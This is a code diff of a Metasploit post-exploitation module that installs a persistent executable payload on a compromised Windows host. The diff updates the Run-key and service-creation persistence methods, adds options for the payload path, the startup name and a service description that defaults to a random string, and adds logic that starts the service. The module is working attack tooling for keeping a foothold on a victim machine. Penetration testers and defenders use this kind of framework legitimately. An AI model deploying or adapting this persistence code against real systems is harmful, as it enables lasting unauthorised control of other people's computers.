@@ -1,15 +1,7 @@
-###
-## This module requires Metasploit: http://metasploit.com/download
-## Current source: https://github.com/rapid7/metasploit-framework
-###
-
-require 'msf/core'
-require 'rex'
-require 'msf/core/post/common'
-require 'msf/core/post/file'
-require 'msf/core/post/windows/priv'
-require 'msf/core/post/windows/registry'
-require 'msf/core/post/windows/services'
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Common
@@ -22,7 +14,7 @@ class MetasploitModule < Msf::Post
     super(update_info(info,
                       'Name' => 'Windows Manage Persistent EXE Payload Installer',
                       'Description'   => %q(
-                            This Module will upload a executable to a remote host and make it Persistent.
+                            This Module will upload an executable to a remote host and make it Persistent.
                             It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login,
                             SYSTEM will start on system boot but requires privs. SERVICE will create a new service
                             which will start the payload. Again requires privs.
@@ -36,10 +28,18 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptEnum.new('STARTUP', [true, 'Startup type for the persistent payload.', 'USER', ['USER', 'SYSTEM', 'SERVICE']]),
-        OptPath.new('REXEPATH', [true, 'The remote executable to use.']),
+        OptPath.new('REXEPATH', [true, 'The remote executable to upload and execute.']),
         OptString.new('REXENAME', [true, 'The name to call exe on remote system', 'default.exe'])
       ], self.class
     )
+
+    register_advanced_options(
+      [
+        OptString.new('LocalExePath', [false, 'The local exe path to run. Use temp directory as default. ']),
+        OptString.new('StartupName',   [false, 'The name of service or registry. Random string as default.' ]),
+        OptString.new('ServiceDescription',   [false, 'The description of service. Random string as default.' ])
+      ])
+
   end
 
   # Run Method for when run command is issued
@@ -125,11 +125,12 @@ class MetasploitModule < Msf::Post
   # Function to install payload in to the registry HKLM or HKCU
   #-------------------------------------------------------------------------------
   def write_to_reg(key, script_on_target)
-    nam = Rex::Text.rand_text_alpha(rand(8) + 8)
+    nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8) + 8)
     print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
     if key
       registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", nam, script_on_target, "REG_SZ")
       print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+      @clean_up_rc << "reg deleteval -k '#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -v '#{nam}'\n"
     else
       print_error("Error: failed to open the registry key for writing")
     end
@@ -140,9 +141,21 @@ class MetasploitModule < Msf::Post
   def install_as_service(script_on_target)
     if  is_system? || is_admin?
       print_status("Installing as service..")
-      nam = Rex::Text.rand_text_alpha(rand(8) + 8)
+      nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8) + 8)
+      description = datastore['ServiceDescription'] || Rex::Text.rand_text_alpha(8)
       print_status("Creating service #{nam}")
-      service_create(nam, nam, "cmd /c \"#{script_on_target}\"")
+
+      key = service_create(nam, :path=>"cmd /c \"#{script_on_target}\"",:display=>description)
+
+      # check if service had been created
+      if key != 0
+        print_error("Service #{nam} creating failed.")
+        return
+      end
+
+      # if service is stopped, then start it.
+      service_start(nam) if service_status(nam)[:state] == 1
+
       @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
     else
       print_error("Insufficient privileges to create service")
@@ -152,15 +165,34 @@ class MetasploitModule < Msf::Post
   # Function for writing executable to target host
   #-------------------------------------------------------------------------------
   def write_exe_to_target(rexe, rexename)
-    tempdir = session.fs.file.expand_path("%TEMP%")
-    temprexe = tempdir + "\\" + rexename
+    # check if we have write permission
+    # I made it by myself because the function filestat.writable? was not implemented yet.
+    if not datastore['LocalExePath'].nil?
+
+      begin
+        temprexe = datastore['LocalExePath'] + "\\" + rexename
+        write_file_to_target(temprexe,rexe)
+      rescue Rex::Post::Meterpreter::RequestError
+        print_warning("Insufficient privileges to write in #{datastore['LocalExePath']}, writing to %TEMP%")
+        temprexe = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
+        write_file_to_target(temprexe,rexe)
+      end
+
+    # Write to %temp% directory if not set LocalExePath
+    else
+      temprexe = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
+      write_file_to_target(temprexe,rexe)
+    end
+
+    print_good("Persistent Script written to #{temprexe}")
+    @clean_up_rc << "rm #{temprexe.gsub("\\", "\\\\\\\\")}\n"
+    temprexe
+  end
+
+  def write_file_to_target(temprexe,rexe)
     fd = session.fs.file.new(temprexe, "wb")
     fd.write(rexe)
     fd.close
-
-    print_good("Persistent Script written to #{temprexe}")
-    @clean_up_rc << "rm #{temprexe}\n"
-    temprexe
   end
 
   # Function to create executable from a file
